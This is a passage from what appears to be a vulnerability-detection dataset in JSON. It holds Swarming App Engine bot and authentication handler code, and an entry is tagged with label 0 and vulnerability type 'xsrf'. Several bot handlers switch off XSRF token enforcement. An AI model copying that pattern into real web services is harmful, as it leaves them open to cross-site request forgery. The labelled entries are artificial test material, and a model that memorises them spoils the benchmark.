much easier.\n    \"\"\"\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    sleep_streak = state.get('sleep_streak', 0)\n    quarantined = bool(quarantined_msg)\n\n    # Note bot existence at two places, one for stats at 1 minute resolution,\n    # the other for the list of known bots.\n    action = 'bot_inactive' if quarantined else 'bot_active'\n    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)\n\n    def bot_event(event_type, task_id=None, task_name=None):\n      bot_management.bot_event(\n          event_type=event_type, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=dimensions,\n          state=state, version=version, quarantined=quarantined,\n          task_id=task_id, task_name=task_name, message=quarantined_msg)\n\n    # Bot version is host-specific because the host URL is embedded in\n    # swarming_bot.zip\n    expected_version = bot_code.get_bot_version(self.request.host_url)\n    if version != expected_version:\n      bot_event('request_update')\n      self._cmd_update(expected_version)\n      return\n    if quarantined:\n      bot_event('request_sleep')\n      self._cmd_sleep(sleep_streak, quarantined)\n      return\n\n    #\n    # At that point, the bot should be in relatively good shape since it's\n    # running the right version. It is still possible that invalid code was\n    # pushed to the server, so be diligent about it.\n    #\n\n    # Bot may need a reboot if it is running for too long. We do not reboot\n    # quarantined bots.\n    needs_restart, restart_message = bot_management.should_restart_bot(\n        bot_id, state)\n    if needs_restart:\n      bot_event('request_restart')\n      self._cmd_restart(restart_message)\n      return\n\n    # The bot is in good shape. Try to grab a task.\n    try:\n      # This is a fairly complex function call, exceptions are expected.\n      request, run_result = task_scheduler.bot_reap_task(\n          dimensions, bot_id, version)\n      if not request:\n        # No task found, tell it to sleep a bit.\n        bot_event('request_sleep')\n        self._cmd_sleep(sleep_streak, quarantined)\n        return\n\n      try:\n        # This part is tricky since it intentionally runs a transaction after\n        # another one.\n        if request.properties.is_terminate:\n          bot_event('bot_terminate', task_id=run_result.task_id)\n          self._cmd_terminate(run_result.task_id)\n        else:\n          bot_event(\n              'request_task', task_id=run_result.task_id,\n              task_name=request.name)\n          self._cmd_run(request, run_result.key, bot_id)\n      except:\n        logging.exception('Dang, exception after reaping')\n        raise\n    except runtime.DeadlineExceededError:\n      # If the timeout happened before a task was assigned there is no problems.\n      # If the timeout occurred after a task was assigned, that task will\n      # timeout (BOT_DIED) since the bot didn't get the details required to\n      # run it) and it will automatically get retried (TODO) when the task times\n      # out.\n      # TODO(maruel): Note the task if possible and hand it out on next poll.\n      # https://code.google.com/p/swarming/issues/detail?id=130\n      self.abort(500, 'Deadline')\n\n  def _cmd_run(self, request, run_result_key, bot_id):\n    # Only one of 'command' or 'inputs_ref' can be set.\n    out = {\n      'cmd': 'run',\n      'manifest': {\n        'bot_id': bot_id,\n        'command':\n            request.properties.commands[0]\n            if request.properties.commands else None,\n        'data': request.properties.data,\n        'dimensions': request.properties.dimensions,\n        'env': request.properties.env,\n        'extra_args': request.properties.extra_args,\n        'grace_period': request.properties.grace_period_secs,\n        'hard_timeout': request.properties.execution_timeout_secs,\n        'host': utils.get_versioned_hosturl(),\n        'io_timeout': request.properties.io_timeout_secs,\n        'inputs_ref': request.properties.inputs_ref,\n        'task_id': task_pack.pack_run_result_key(run_result_key),\n      },\n    }\n    self.send_response(utils.to_json_encodable(out))\n\n  def _cmd_sleep(self, sleep_streak, quarantined):\n    out = {\n      'cmd': 'sleep',\n      'duration': task_scheduler.exponential_backoff(sleep_streak),\n      'quarantined': quarantined,\n    }\n    self.send_response(out)\n\n  def _cmd_terminate(self, task_id):\n    out = {\n      'cmd': 'terminate',\n      'task_id': task_id,\n    }\n    self.send_response(out)\n\n  def _cmd_update(self, expected_version):\n    out = {\n      'cmd': 'update',\n      'version': expected_version,\n    }\n    self.send_response(out)\n\n  def _cmd_restart(self, message):\n    logging.info('Rebooting bot: %s', message)\n    out = {\n      'cmd': 'restart',\n      'message': message,\n    }\n    self.send_response(out)\n\n\nclass BotEventHandler(_BotBaseHandler):\n  \"\"\"On signal that a bot had an event worth logging.\"\"\"\n\n  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    (request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    event = request.get('event')\n    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):\n      self.abort_with_error(400, error='Unsupported event type')\n    message = request.get('message')\n    bot_management.bot_event(\n        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,\n        dimensions=dimensions, state=state, version=version,\n        quarantined=bool(quarantined_msg), task_id=None, task_name=None,\n        message=message)\n\n    if event == 'bot_error':\n      line = (\n          'Bot: https://%s/restricted/bot/%s\\n'\n          'Bot error:\\n'\n          '%s') % (\n          app_identity.get_default_version_hostname(), bot_id, message)\n      ereporter2.log_request(self.request, source='bot', message=line)\n    self.send_response({})\n\n\nclass BotTaskUpdateHandler(auth.ApiHandler):\n  \"\"\"Receives updates from a Bot for a task.\n\n  The handler verifies packets are processed in order and will refuse\n  out-of-order packets.\n  \"\"\"\n  ACCEPTED_KEYS = {\n    u'cost_usd', u'duration', u'exit_code', u'hard_timeout',\n    u'id', u'io_timeout', u'output', u'output_chunk_start', u'outputs_ref',\n    u'task_id',\n  }\n  REQUIRED_KEYS = {u'id', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    # Unlike handshake and poll, we do not accept invalid keys here. This code\n    # path is much more strict.\n    request = self.parse_body()\n    msg = log_unexpected_subset_keys(\n        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',\n        'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    bot_id = request['id']\n    cost_usd = request['cost_usd']\n    task_id = request['task_id']\n\n    duration = request.get('duration')\n    exit_code = request.get('exit_code')\n    hard_timeout = request.get('hard_timeout')\n    io_timeout = request.get('io_timeout')\n    output = request.get('output')\n    output_chunk_start = request.get('output_chunk_start')\n    outputs_ref = request.get('outputs_ref')\n\n    run_result_key = task_pack.unpack_run_result_key(task_id)\n    if output is not None:\n      try:\n        output = base64.b64decode(output)\n      except UnicodeEncodeError as e:\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n        output = output.encode('ascii', 'replace')\n      except TypeError as e:\n        # Save the output as-is instead. The error will be logged in ereporter2\n        # and returning a HTTP 500 would only force the bot to stay in a retry\n        # loop.\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n\n    try:\n      success, completed = task_scheduler.bot_update_task(\n          run_result_key, bot_id, output, output_chunk_start,\n          exit_code, duration, hard_timeout, io_timeout, cost_usd, outputs_ref)\n      if not success:\n        logging.info('Failed to update, please retry')\n        self.abort_with_error(500, error='Failed to update, please retry')\n\n      action = 'task_completed' if completed else 'task_update'\n      bot_management.bot_event(\n          event_type=action, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=None, state=None,\n          version=None, quarantined=None, task_id=task_id, task_name=None)\n    except ValueError as e:\n      ereporter2.log_request(\n          request=self.request,\n          source='server',\n          category='task_failure',\n          message='Failed to update task: %s' % e)\n      self.abort_with_error(400, error=str(e))\n    except webob.exc.HTTPException:\n      raise\n    except Exception as e:\n      logging.exception('Internal error: %s', e)\n      self.abort_with_error(500, error=str(e))\n\n    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot\n    # reboots itself to abort the task abruptly. It is useful when a task hangs\n    # and the timeout was set too long or the task was superseded by a newer\n    # task with more recent executable (e.g. a new Try Server job on a newer\n    # patchset on Rietveld).\n    self.send_response({'ok': True})\n\n\nclass BotTaskErrorHandler(auth.ApiHandler):\n  \"\"\"It is a specialized version of ereporter2's /ereporter2/api/v1/on_error\n  that also attaches a task id to it.\n\n  This formally kills the task, marking it as an internal failure. This can be\n  used by bot_main.py to kill the task when task_runner misbehaved.\n  \"\"\"\n\n  EXPECTED_KEYS = {u'id', u'message', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    request = self.parse_body()\n    bot_id = request.get('id')\n    task_id = request.get('task_id', '')\n    message = request.get('message', 'unknown')\n\n    bot_management.bot_event(\n        event_type='task_error', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=None, state=None,\n        version=None, quarantined=None, task_id=task_id, task_name=None,\n        message=message)\n    line = (\n        'Bot: https://%s/restricted/bot/%s\\n'\n        'Task failed: https://%s/user/task/%s\\n'\n        '%s') % (\n        app_identity.get_default_version_hostname(), bot_id,\n        app_identity.get_default_version_hostname(), task_id,\n        message)\n    ereporter2.log_request(self.request, source='bot', message=line)\n\n    msg = log_unexpected_keys(\n        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    msg = task_scheduler.bot_kill_task(\n        task_pack.unpack_run_result_key(task_id), bot_id)\n    if msg:\n      logging.error(msg)\n      self.abort_with_error(400, error=msg)\n    self.send_response({})\n\n\nclass ServerPingHandler(webapp2.RequestHandler):\n  \"\"\"Handler to ping when checking if the server is up.\n\n  This handler should be extremely lightweight. It shouldn't do any\n  computations, it should just state that the server is up. It's open to\n  everyone for simplicity and performance.\n  \"\"\"\n\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'\n    self.response.out.write('Server up')\n\n\ndef get_routes():\n  routes = [\n      ('/bootstrap', BootstrapHandler),\n      ('/bot_code', BotCodeHandler),\n      ('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),\n      ('/swarming/api/v1/bot/event', BotEventHandler),\n      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),\n      ('/swarming/api/v1/bot/poll', BotPollHandler),\n      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),\n      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',\n          BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),\n      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',\n          BotTaskErrorHandler),\n  ]\n  return [webapp2.Route(*i) for i in routes]\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "0ba6a589d77baefc5ae20cde5c3a5dc24a6290f9", "code": "/appengine/components/components/auth/handler.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Integration with webapp2.\"\"\"\n\n# Disable 'Method could be a function.'\n# pylint: disable=R0201\n\nimport functools\nimport json\nimport logging\nimport urllib\nimport webapp2\n\nfrom google.appengine.api import urlfetch\nfrom google.appengine.api import users\n\nfrom components import utils\n\nfrom . import api\nfrom . import config\nfrom . import delegation\nfrom . import host_token\nfrom . import ipaddr\nfrom . import model\nfrom . import openid\nfrom . import tokens\n\n# Part of public API of 'auth' component, exposed by this module.\n__all__ = [\n  'ApiHandler',\n  'AuthenticatingHandler',\n  'gae_cookie_authentication',\n  'get_authenticated_routes',\n  'oauth_authentication',\n  'openid_cookie_authentication',\n  'require_xsrf_token_request',\n  'service_to_service_authentication',\n]\n\n\ndef require_xsrf_token_request(f):\n  \"\"\"Use for handshaking APIs.\"\"\"\n  @functools.wraps(f)\n  def hook(self, *args, **kwargs):\n    if not self.request.headers.get('X-XSRF-Token-Request'):\n      raise api.AuthorizationError('Missing required XSRF request header')\n    return f(self, *args, **kwargs)\n  return hook\n\n\nclass XSRFToken(tokens.TokenKind):\n  \"\"\"XSRF token parameters.\"\"\"\n  expiration_sec = 4 * 3600\n  secret_key = api.SecretKey('xsrf_token', scope='local')\n  version = 1\n\n\nclass AuthenticatingHandlerMetaclass(type):\n  \"\"\"Ensures that 'get', 'post', etc. are marked with @require or @public.\"\"\"\n\n  def __new__(mcs, name, bases, attributes):\n    for method in webapp2.WSGIApplication.allowed_methods:\n      func = attributes.get(method.lower())\n      if func and not api.is_decorated(func):\n        raise TypeError(\n            'Method \\'%s\\' of \\'%s\\' is not protected by @require or @public '\n            'decorator' % (method.lower(), name))\n    return type.__new__(mcs, name, bases, attributes)\n\n\nclass AuthenticatingHandler(webapp2.RequestHandler):\n  \"\"\"Base class for webapp2 request handlers that use Auth system.\n\n  Knows how to extract Identity from request data and how to initialize auth\n  request context, so that get_current_identity() and is_group_member() work.\n\n  All request handling methods (like 'get', 'post', etc) should be marked by\n  either @require or @public decorators.\n  \"\"\"\n\n  # Checks that all 'get', 'post', etc. are marked with @require or @public.\n  __metaclass__ = AuthenticatingHandlerMetaclass\n\n  # List of HTTP methods that trigger XSRF token validation.\n  xsrf_token_enforce_on = ('DELETE', 'POST', 'PUT')\n  # If not None, the header to search for XSRF token.\n  xsrf_token_header = 'X-XSRF-Token'\n  # If not None, the request parameter (GET or POST) to search for XSRF token.\n  xsrf_token_request_param = 'xsrf_token'\n  # Embedded data extracted from XSRF token of current request.\n  xsrf_token_data = None\n  # If not None, sets X_Frame-Options on all replies.\n  frame_options = 'DENY'\n  # A method used to authenticate this request, see get_auth_methods().\n  auth_method = None\n\n  def dispatch(self):\n    \"\"\"Extracts and verifies Identity, sets up request auth context.\"\"\"\n    # Ensure auth component is configured before executing any code.\n    conf = config.ensure_configured()\n    auth_context = api.reinitialize_request_cache()\n\n    # http://www.html5rocks.com/en/tutorials/security/content-security-policy/\n    # https://www.owasp.org/index.php/Content_Security_Policy\n    # TODO(maruel): Remove 'unsafe-inline' once all inline style=\"foo:bar\" in\n    # all HTML tags were removed. Warning if seeing this post 2016, it could\n    # take a while.\n    # - https://www.google.com is due to Google Viz library.\n    # - https://www.google-analytics.com due to Analytics.\n    # - 'unsafe-eval' due to polymer.\n    self.response.headers['Content-Security-Policy'] = (\n        'default-src https: \\'self\\' \\'unsafe-inline\\' https://www.google.com '\n        'https://www.google-analytics.com \\'unsafe-eval\\'')\n    # Enforce HTTPS by adding the HSTS header; 365*24*60*60s.\n    # https://www.owasp.org/index.php/HTTP_Strict_Transport_Security\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=31536000; includeSubDomains; preload')\n    # Disable frame support wholesale.\n    # https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet\n    if self.frame_options:\n      self.response.headers['X-Frame-Options'] = self.frame_options\n\n    identity = None\n    for method_func in self.get_auth_methods(conf):\n      try:\n        identity = method_func(self.request)\n        if identity:\n          break\n      except api.AuthenticationError as err:\n        self.authentication_error(err)\n        return\n      except api.AuthorizationError as err:\n        self.authorization_error(err)\n        return\n    else:\n      method_func = None\n    self.auth_method = method_func\n\n    # If no authentication method is applicable, default to anonymous identity.\n    identity = identity or model.Anonymous\n\n    # XSRF token is required only if using Cookie based or IP whitelist auth.\n    # A browser doesn't send Authorization: 'Bearer ...' or any other headers\n    # by itself. So XSRF check is not required if header based authentication\n    # is used.\n    using_headers_auth = method_func in (\n        oauth_authentication, service_to_service_authentication)\n\n    # Extract caller host name from host token header, if present and valid.\n    host_tok = self.request.headers.get(host_token.HTTP_HEADER)\n    if host_tok:\n      validated_host = host_token.validate_host_token(host_tok)\n      if validated_host:\n        auth_context.peer_host = validated_host\n\n    # Verify IP is whitelisted and authenticate requests from bots.\n    assert self.request.remote_addr\n    ip = ipaddr.ip_from_string(self.request.remote_addr)\n    auth_context.peer_ip = ip\n    try:\n      # 'verify_ip_whitelisted' may change identity for bots, store new one.\n      auth_context.peer_identity = api.verify_ip_whitelisted(\n          identity, ip, self.request.headers)\n    except api.AuthorizationError as err:\n      self.authorization_error(err)\n      return\n\n    # Parse delegation token, if given, to deduce end-user identity.\n    delegation_tok = self.request.headers.get(delegation.HTTP_HEADER)\n    if delegation_tok:\n      try:\n        auth_context.current_identity = delegation.check_delegation_token(\n            delegation_tok, auth_context.peer_identity)\n      except delegation.BadTokenError as exc:\n        self.authorization_error(\n            api.AuthorizationError('Bad delegation token: %s' % exc))\n      except delegation.TransientError as exc:\n        msg = 'Transient error while validating delegation token.\\n%s' % exc\n        logging.error(msg)\n        self.abort(500, detail=msg)\n    else:\n      auth_context.current_identity = auth_context.peer_identity\n\n    try:\n      # Fail if XSRF token is required, but not provided.\n      need_xsrf_token = (\n          not using_headers_auth and\n          self.request.method in self.xsrf_token_enforce_on)\n      if need_xsrf_token and self.xsrf_token is None:\n        raise api.AuthorizationError('XSRF token is missing')\n\n      # If XSRF token is present, verify it is valid and extract its payload.\n      # Do it even if XSRF token is not strictly required, since some handlers\n      # use it to store session state (it is similar to a signed cookie).\n      self.xsrf_token_data = {}\n      if self.xsrf_token is not None:\n        # This raises AuthorizationError if token is invalid.\n        self.xsrf_token_data = self.verify_xsrf_token()\n\n      # All other ACL checks will be performed by corresponding handlers\n      # manually or via '@required' decorator. Failed ACL check raises\n      # AuthorizationError.\n      super(AuthenticatingHandler, self).dispatch()\n    except api.AuthorizationError as err:\n      self.authorization_error(err)\n\n  @classmethod\n  def get_auth_methods(cls, conf):\n    \"\"\"Returns an enumerable of functions to use to authenticate request.\n\n    The handler will try to apply auth methods sequentially one by one by until\n    it finds one that works.\n\n    Each auth method is a function that accepts webapp2.Request and can finish\n    with 3 outcomes:\n\n    * Return None: authentication method is not applicable to that request\n      and next method should be tried (for example cookie-based\n      authentication is not applicable when there's no cookies).\n\n    * Returns Identity associated with the request. Means authentication method\n      is applicable and request authenticity is confirmed.\n\n    * Raises AuthenticationError: authentication method is applicable, but\n      request contains bad credentials or invalid token, etc. For example,\n      OAuth2 token is given, but it is revoked.\n\n    A chosen auth method function will be stored in request's auth_method field.\n\n    Args:\n      conf: components.auth GAE config, see config.py.\n    \"\"\"\n    if conf.USE_OPENID:\n      cookie_auth = openid_cookie_authentication\n    else:\n      cookie_auth = gae_cookie_authentication\n    return oauth_authentication, cookie_auth, service_to_service_authentication\n\n  def generate_xsrf_token(self, xsrf_token_data=None):\n    \"\"\"Returns new XSRF token that embeds |xsrf_token_data|.\n\n    The token is bound to current identity and is valid only when used by same\n    identity.\n    \"\"\"\n    return XSRFToken.generate(\n        [api.get_current_identity().to_bytes()], xsrf_token_data)\n\n  @property\n  def xsrf_token(self):\n    \"\"\"Returns XSRF token passed with the request or None if missing.\n\n    Doesn't do any validation. Use verify_xsrf_token() instead.\n    \"\"\"\n    token = None\n    if self.xsrf_token_header:\n      token = self.request.headers.get(self.xsrf_token_header)\n    if not token and self.xsrf_token_request_param:\n      param = self.request.get_all(self.xsrf_token_request_param)\n      token = param[0] if param else None\n    return token\n\n  def verify_xsrf_token(self):\n    \"\"\"Grabs a token from the request, validates it and extracts embedded data.\n\n    Current identity must be the same as one used to generate the token.\n\n    Returns:\n      Whatever was passed as |xsrf_token_data| in 'generate_xsrf_token'\n      method call used to generate the token.\n\n    Raises:\n      AuthorizationError if token is missing, invalid or expired.\n    \"\"\"\n    token = self.xsrf_token\n    if not token:\n      raise api.AuthorizationError('XSRF token is missing')\n    # Check that it was generated for the same identity.\n    try:\n      return XSRFToken.validate(token, [api.get_current_identity().to_bytes()])\n    except tokens.InvalidTokenError as err:\n      raise api.AuthorizationError(str(err))\n\n  def authentication_error(self, error):\n    \"\"\"Called when authentication fails to report the error to requester.\n\n    Authentication error means that some credentials are provided but they are\n    invalid. If no credentials are provided at all, no authentication is\n    attempted and current identity is just set to 'anonymous:anonymous'.\n\n    Default behavior is to abort the request with HTTP 401 error (and human\n    readable HTML body).\n\n    Args:\n      error: instance of AuthenticationError subclass.\n    \"\"\"\n    logging.warning('Authentication error.\\n%s', error)\n    self.abort(401, detail=str(error))\n\n  def authorization_error(self, error):\n    \"\"\"Called when authentication succeeds, but access to a resource is denied.\n\n    Called whenever request handler raises AuthorizationError exception.\n    In particular this exception is raised by method decorated with @require if\n    current identity doesn't have required permission.\n\n    Default behavior is to abort the request with HTTP 403 error (and human\n    readable HTML body).\n\n    Args:\n      error: instance of AuthorizationError subclass.\n    \"\"\"\n    logging.warning(\n        'Authorization error.\\n%s\\nPeer: %s\\nIP: %s',\n        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)\n    self.abort(403, detail=str(error))\n\n  ### Wrappers around Users API or its OpenID equivalent.\n\n  def get_current_user(self):\n    \"\"\"When cookie auth is used returns instance of CurrentUser or None.\"\"\"\n    return self._get_users_api().get_current_user(self.request)\n\n  def is_current_user_gae_admin(self):\n    \"\"\"When cookie auth is used returns True if current caller is GAE admin.\"\"\"\n    return self._get_users_api().is_current_user_gae_admin(self.request)\n\n  def create_login_url(self, dest_url):\n    \"\"\"When cookie auth is used returns URL to redirect user to login.\"\"\"\n    return self._get_users_api().create_login_url(self.request, dest_url)\n\n  def create_logout_url(self, dest_url):\n    \"\"\"When cookie auth is used returns URL to redirect user to logout.\"\"\"\n    return self._get_users_api().create_logout_url(self.request, dest_url)\n\n  def _get_users_api(self):\n    \"\"\"Returns GAEUsersAPI, OpenIDAPI or raises NotImplementedError.\n\n    Chooses based on what auth_method was used of what methods are available.\n    \"\"\"\n    method = self.auth_method\n    if not method:\n      # Anonymous request -> pick first method that supports API.\n      for method in self.get_auth_methods(config.ensure_configured()):\n        if method in _METHOD_TO_USERS_API:\n          break\n      else:\n        raise NotImplementedError('No methods support UsersAPI')\n    elif method not in _METHOD_TO_USERS_API:\n      raise NotImplementedError(\n          '%s doesn\\'t support UsersAPI' % method.__name__)\n    return _METHOD_TO_USERS_API[method]\n\n\nclass ApiHandler(AuthenticatingHandler):\n  \"\"\"Parses JSON request body to a dict, serializes response to JSON.\"\"\"\n  CONTENT_TYPE_BASE = 'application/json'\n  CONTENT_TYPE_FULL = 'application/json; charset=utf-8'\n  _json_body = None\n  # Clickjacking not applicable to APIs.\n  frame_options = None\n\n  def authentication_error(self, error):\n    logging.warning('Authentication error.\\n%s', error)\n    self.abort_with_error(401, text=str(error))\n\n  def authorization_error(self, error):\n    logging.warning(\n        'Authorization error.\\n%s\\nPeer: %s\\nIP: %s',\n        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)\n    self.abort_with_error(403, text=str(error))\n\n  def send_response(self, response, http_code=200, headers=None):\n    \"\"\"Sends successful reply and continues execution.\"\"\"\n    self.response.set_status(http_code)\n    self.response.headers.update(headers or {})\n    self.response.headers['Content-Type'] = self.CONTENT_TYPE_FULL\n    self.response.write(json.dumps(response))\n\n  def abort_with_error(self, http_code, **kwargs):\n    \"\"\"Sends error reply and stops execution.\"\"\"\n    self.abort(\n        http_code,\n        json=kwargs,\n        headers={'Content-Type': self.CONTENT_TYPE_FULL})\n\n  def parse_body(self):\n    \"\"\"Parses JSON body and verifies it's a dict.\n\n    webob.Request doesn't cache the decoded json body, this function does.\n    \"\"\"\n    if self._json_body is None:\n      if (self.CONTENT_TYPE_BASE and\n          self.request.content_type != self.CONTENT_TYPE_BASE):\n        msg = (\n            'Expecting JSON body with content type \\'%s\\'' %\n            self.CONTENT_TYPE_BASE)\n        self.abort_with_error(400, text=msg)\n      try:\n        self._json_body = self.request.json\n        if not isinstance(self._json_body, dict):\n          raise ValueError()\n      except (LookupError, ValueError):\n        self.abort_with_error(400, text='Not a valid json dict body')\n    return self._json_body.copy()\n\n\ndef get_authenticated_routes(app):\n  \"\"\"Given WSGIApplication returns list of routes that use authentication.\n\n  Intended to be used only for testing.\n  \"\"\"\n  # This code is adapted from router's __repr__ method (that enumerate\n  # all routes for pretty-printing).\n  routes = list(app.router.match_routes)\n  routes.extend(\n      v for k, v in app.router.build_routes.iteritems()\n      if v not in app.router.match_routes)\n  return [r for r in routes if issubclass(r.handler, AuthenticatingHandler)]\n\n\n################################################################################\n## All supported implementations of authentication methods for webapp2 handlers.\n\n\ndef gae_cookie_authentication(_request):\n  \"\"\"AppEngine cookie based authentication via users.get_current_user().\"\"\"\n  user = users.get_current_user()\n  try:\n    return model.Identity(model.IDENTITY_USER, user.email()) if user else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % user.email())\n\n\ndef openid_cookie_authentication(request):\n  \"\"\"Cookie based authentication that uses OpenID flow for login.\"\"\"\n  user = openid.get_current_user(request)\n  try:\n    return model.Identity(model.IDENTITY_USER, user.email) if user else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % user.email)\n\n\ndef oauth_authentication(request):\n  \"\"\"OAuth2 based authentication via oauth.get_current_user().\"\"\"\n  if not request.headers.get('Authorization'):\n    return None\n  if not utils.is_local_dev_server():\n    return api.extract_oauth_caller_identity()\n\n  # OAuth2 library is mocked on dev server to return some nonsense. Use (slow,\n  # but real) OAuth2 API endpoint instead to validate access_token. It is also\n  # what Cloud Endpoints do on a local server. For simplicity ignore client_id\n  # on dev server.\n  header = request.headers['Authorization'].split(' ', 1)\n  if len(header) != 2 or header[0] not in ('OAuth', 'Bearer'):\n    raise api.AuthenticationError('Invalid authorization header')\n\n  # Adapted from endpoints/users_id_tokens.py, _set_bearer_user_vars_local.\n  base_url = 'https://www.googleapis.com/oauth2/v1/tokeninfo'\n  result = urlfetch.fetch(\n      url='%s?%s' % (base_url, urllib.urlencode({'access_token': header[1]})),\n      follow_redirects=False,\n      validate_certificate=True)\n  if result.status_code != 200:\n    try:\n      error = json.loads(result.content)['error_description']\n    except (KeyError, ValueError):\n      error = repr(result.content)\n    raise api.AuthenticationError('Failed to validate the token: %s' % error)\n\n  token_info = json.loads(result.content)\n  if 'email' not in token_info:\n    raise api.AuthenticationError('Token doesn\\'t include an email address')\n  if not token_info.get('verified_email'):\n    raise api.AuthenticationError('Token email isn\\'t verified')\n\n  email = token_info['email']\n  try:\n    return model.Identity(model.IDENTITY_USER, email)\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % email)\n\n\ndef service_to_service_authentication(request):\n  \"\"\"Used for AppEngine <-> AppEngine communication.\n\n  Relies on X-Appengine-Inbound-Appid header set by AppEngine itself. It can't\n  be set by external users (with exception of admins).\n  \"\"\"\n  app_id = request.headers.get('X-Appengine-Inbound-Appid')\n  try:\n    return model.Identity(model.IDENTITY_SERVICE, app_id) if app_id else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported application ID: %s' % app_id)\n\n\n################################################################################\n## API wrapper on top of Users API and OpenID API to make them similar.\n\n\nclass CurrentUser(object):\n  \"\"\"Mimics subset of GAE users.User object for ease of transition.\n\n  Also adds .picture().\n  \"\"\"\n\n  def __init__(self, user_id, email, picture):\n    self._user_id = user_id\n    self._email = email\n    self._picture = picture\n\n  def nickname(self):\n    return self._email\n\n  def email(self):\n    return self._email\n\n  def user_id(self):\n    return self._user_id\n\n  def picture(self):\n    return self._picture\n\n  def __unicode__(self):\n    return unicode(self.nickname())\n\n  def __str__(self):\n    return str(self.nickname())\n\n\nclass GAEUsersAPI(object):\n  @staticmethod\n  def get_current_user(request):  # pylint: disable=unused-argument\n    user = users.get_current_user()\n    return CurrentUser(user.user_id(), user.email(), None) if user else None\n\n  @staticmethod\n  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument\n    return users.is_current_user_admin()\n\n  @staticmethod\n  def create_login_url(request, dest_url):  # pylint: disable=unused-argument\n    return users.create_login_url(dest_url)\n\n  @staticmethod\n  def create_logout_url(request, dest_url):  # pylint: disable=unused-argument\n    return users.create_logout_url(dest_url)\n\n\nclass OpenIDAPI(object):\n  @staticmethod\n  def get_current_user(request):\n    user = openid.get_current_user(request)\n    return CurrentUser(user.sub, user.email, user.picture) if user else None\n\n  @staticmethod\n  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument\n    return False\n\n  @staticmethod\n  def create_login_url(request, dest_url):\n    return openid.create_login_url(request, dest_url)\n\n  @staticmethod\n  def create_logout_url(request, dest_url):\n    return openid.create_logout_url(request, dest_url)\n\n\n# See AuthenticatingHandler._get_users_api().\n_METHOD_TO_USERS_API = {\n  gae_cookie_authentication: GAEUsersAPI,\n  openid_cookie_authentication: OpenIDAPI,\n}\n/n/n/n/appengine/components/components/auth/handler_test.py/n/n#!/usr/bin/env python\n# Copyright 2014 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n# Disable 'Unused variable', 'Unused argument' and 'Method could be a function'.\n# pylint: disable=W0612,W0613,R0201\n\nimport datetime\nimport json\nimport os\nimport sys\nimport unittest\n\nfrom test_support import test_env\ntest_env.setup_test_env()\n\nfrom google.appengine.api import oauth\nfrom google.appengine.api import users\n\nimport webapp2\nimport webtest\n\nfrom components import utils\nfrom components.auth import api\nfrom components.auth import delegation\nfrom components.auth import handler\nfrom components.auth import host_token\nfrom components.auth import ipaddr\nfrom components.auth import model\nfrom components.auth.proto import delegation_pb2\nfrom test_support import test_case\n\n\nclass AuthenticatingHandlerMetaclassTest(test_case.TestCase):\n  \"\"\"Tests for AuthenticatingHandlerMetaclass.\"\"\"\n\n  def test_good(self):\n    # No request handling methods defined at all.\n    class TestHandler1(handler.AuthenticatingHandler):\n      def some_other_method(self):\n        pass\n\n    # @public is used.\n    class TestHandler2(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        pass\n\n    # @require is used.\n    class TestHandler3(handler.AuthenticatingHandler):\n      @api.require(lambda: True)\n      def get(self):\n        pass\n\n  def test_bad(self):\n    # @public or @require is missing.\n    with self.assertRaises(TypeError):\n      class TestHandler1(handler.AuthenticatingHandler):\n        def get(self):\n          pass\n\n\nclass AuthenticatingHandlerTest(test_case.TestCase):\n  \"\"\"Tests for AuthenticatingHandler class.\"\"\"\n\n  def setUp(self):\n    super(AuthenticatingHandlerTest, self).setUp()\n    # Reset global config of auth library before each test.\n    api.reset_local_state()\n    # Capture error and warning log messages.\n    self.logged_errors = []\n    self.mock(handler.logging, 